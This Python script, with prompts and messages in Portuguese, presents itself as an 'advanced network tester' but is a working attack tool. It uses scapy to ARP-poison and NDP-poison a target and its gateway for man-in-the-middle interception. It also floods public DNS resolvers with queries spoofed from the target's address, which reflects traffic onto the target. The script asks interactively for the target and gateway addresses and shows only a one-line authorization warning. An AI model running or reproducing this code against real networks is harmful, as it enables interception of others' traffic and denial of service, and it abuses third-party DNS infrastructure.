#!/usr/bin/env python3
from scapy.all import *
import threading
import time
import argparse
import os
import signal
import random
import sys
from datetime import datetime

def dict_to_xml(tag, d):
    """Converte um dicionário em uma string XML simples."""
    parts = [f"<{tag}>"]
    for key, value in d.items():
        if isinstance(value, dict):
            parts.append(dict_to_xml(key, value))
        else:
            parts.append(f"<{key}>{value}</{key}>")
    parts.append(f"</{tag}>")
    return ''.join(parts)

class AdvancedNetworkTester:
    def __init__(self, target_ip, gateway_ipv4, gateway_ipv6, duration, dns_ipv4=["8.8.8.8"], dns_ipv6=["2001:4860:4860::8888"]):
        self.target_ip = target_ip
        self.gateway_ipv4 = gateway_ipv4
        self.gateway_ipv6 = gateway_ipv6
        self.dns_ipv4 = dns_ipv4
        self.dns_ipv6 = dns_ipv6
        self.attack_duration = duration
        
        self.running = False
        self.start_time = None
        
        self.log_dir = "/var/log/network_tests"
        os.makedirs(self.log_dir, exist_ok=True)
        self.log_file = os.path.join(self.log_dir, f"test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml")
        
        self.stats = {
            'arp_packets_sent': 0,
            'dns_packets_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None
        }

    def _log_event(self, event_type, message):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'message': message,
            'stats': self.stats.copy()
        }
        
        try:
            with open(self.log_file, 'a') as f:
                xml_entry = dict_to_xml('log', log_entry)
                f.write(xml_entry + '\n')
        except Exception as e:
            print(f"[LOG ERROR] {str(e)}")

    def arp_poison(self):
        self._log_event('ARP_START', 'Iniciando envenenamento ARP')
        while self.running:
            try:
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ipv4), verbose=0)
                send(ARP(op=2, pdst=self.gateway_ipv4, psrc=self.target_ip), verbose=0)
                self.stats['arp_packets_sent'] += 2
                time.sleep(0.5)
            except Exception as e:
                self.stats['errors'] += 1
                self._log_event('ARP_ERROR', str(e))
                time.sleep(1)

    def ndp_poison(self):
        self._log_event('NDP_START', 'Iniciando envenenamento NDP')
        while self.running and self.gateway_ipv6:
            try:
                send(IPv6(dst=self.gateway_ipv6) / ICMPv6ND_NS(tgt=self.target_ip), verbose=0)
                send(IPv6(dst=self.target_ip) / ICMPv6ND_NA(tgt=self.gateway_ipv6), verbose=0)
                self.stats['arp_packets_sent'] += 2
                time.sleep(0.5)
            except Exception as e:
                self.stats['errors'] += 1
                self._log_event('NDP_ERROR', str(e))
                time.sleep(1)

    def dns_flood(self):
        self._log_event('DNS_START', 'Iniciando DNS flood')
        while self.running:
            # Target all IPv4 DNS servers
            for dns in self.dns_ipv4:
                try:
                    send(
                        IP(dst=dns, src=self.target_ip) /
                        UDP(dport=53) /
                        DNS(
                            rd=1,
                            qd=DNSQR(qname=random.choice([ "google.com", "youtube.com", "facebook.com", "instagram.com", "twitter.com"]))
                        ),
                        verbose=0
                    )
                    self.stats['dns_packets_sent'] += 1
                    time.sleep(0.01)
                except Exception as e:
                    self.stats['errors'] += 1
                    self._log_event('DNS_ERROR', str(e))
                    time.sleep(0.1)

            # Target all IPv6 DNS servers
            for dns in self.dns_ipv6:
                try:
                    send(
                        IPv6(dst=dns, src=self.target_ip) /
                        UDP(dport=53) /
                        DNS(
                            rd=1,
                            qd=DNSQR(qname=random.choice([ "google.com", "youtube.com", "facebook.com", "instagram.com", "twitter.com"]))
                        ),
                        verbose=0
                    )
                    self.stats['dns_packets_sent'] += 1
                    time.sleep(0.01)
                except Exception as e:
                    self.stats['errors'] += 1
                    self._log_event('DNS_ERROR', str(e))
                    time.sleep(0.1)

    def restore_network(self):
        self._log_event('RESTORE', 'Restaurando tabelas ARP')
        try:
            send(ARP(op=2, pdst=self.gateway_ipv4, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ipv4, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
        except Exception as e:
            self._log_event('RESTORE_ERROR', str(e))

    def start(self):
        if os.getuid() != 0:
            print("❌ Este script requer privilégios de root (sudo)")
            return

        self.running = True
        self.stats['start_time'] = datetime.now().isoformat()
        self.start_time = time.time()
        
        print(f"\n🔧 Configuração do Teste:")
        print(f"   • Alvo: {self.target_ip}")
        print(f"   • Gateway IPv4: {self.gateway_ipv4}")
        print(f"   • Gateway IPv6: {self.gateway_ipv6}")
        print(f"   • DNS IPv4: {', '.join(self.dns_ipv4)}")
        print(f"   • DNS IPv6: {', '.join(self.dns_ipv6)}")
        print(f"   • Duração: {self.attack_duration}s")
        print(f"   • Log File: {self.log_file}\n")
        
        if self.gateway_ipv4:
            threading.Thread(target=self.arp_poison, daemon=True).start()
        if self.gateway_ipv6:
            threading.Thread(target=self.ndp_poison, daemon=True).start()
        threading.Thread(target=self.dns_flood, daemon=True).start()
        
        try:
            while self.running and (time.time() - self.start_time < self.attack_duration):
                elapsed = time.time() - self.start_time
                print(
                    f"\r⏱ {elapsed:.1f}s/{self.attack_duration}s | "
                    f"ARP: {self.stats['arp_packets_sent']} | "
                    f"DNS: {self.stats['dns_packets_sent']} | "
                    f"Erros: {self.stats['errors']}",
                    end='', flush=True
                )
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n🛑 Interrompido pelo usuário!")
        
        self.stop()

    def stop(self):
        self.running = False
        self.stats['end_time'] = datetime.now().isoformat()
        
        self.restore_network()
        self._log_event('TEST_END', 'Teste concluído')
        
        duration = time.time() - self.start_time
        print("\n\n📊 Relatório Final:")
        print(f"   • Duração real: {duration:.1f}s")
        print(f"   • Pacotes ARP enviados: {self.stats['arp_packets_sent']}")
        print(f"   • Pacotes DNS enviados: {self.stats['dns_packets_sent']}")
        print(f"   • Taxa DNS: {self.stats['dns_packets_sent']/max(1, duration):.1f} pps")
        print(f"   • Erros registrados: {self.stats['errors']}")
        print(f"   • Log completo em: {self.log_file}\n")

def signal_handler(sig, frame):
    print("\n🛑 Recebido sinal de interrupção!")
    tester.stop()
    sys.exit(0)

def get_user_input(prompt, default=None):
    user_input = input(f"{prompt} [{default}]: ")
    return user_input.strip() if user_input.strip() else default

def main():
    global tester
    
    target = get_user_input("Digite o endereço IP do alvo")
    gateway_ipv4 = get_user_input("Digite o endereço IPv4 do gateway (deixe em branco para não usar IPv4)", "")
    gateway_ipv6 = get_user_input("Digite o endereço IPv6 do gateway (deixe em branco para não usar IPv6)", "")
    
    # DNS lists
    dns_ipv4_input = get_user_input("Digite os servidores DNS IPv4 separados por vírgula (deixe em branco para usar o padrão: 8.8.8.8)", "8.8.8.8")
    dns_ipv4 = dns_ipv4_input.split(",") if dns_ipv4_input else ["8.8.8.8"]
    
    dns_ipv6_input = get_user_input("Digite os servidores DNS IPv6 separados por vírgula (deixe em branco para usar o padrão: 2001:4860:4860::8888)", "2001:4860:4860::8888")
    dns_ipv6 = dns_ipv6_input.split(",") if dns_ipv6_input else ["2001:4860:4860::8888"]
    
    duration = int(get_user_input("Digite a duração do teste em segundos", "60"))

    print("\n⚠️ AVISO LEGAL: Use apenas em redes próprias ou com autorização explícita!\n")
    
    tester = AdvancedNetworkTester(target, gateway_ipv4, gateway_ipv6, duration, dns_ipv4, dns_ipv6)
    signal.signal(signal.SIGINT, signal_handler)
    tester.start()
    
if __name__ == "__main__":
    main()
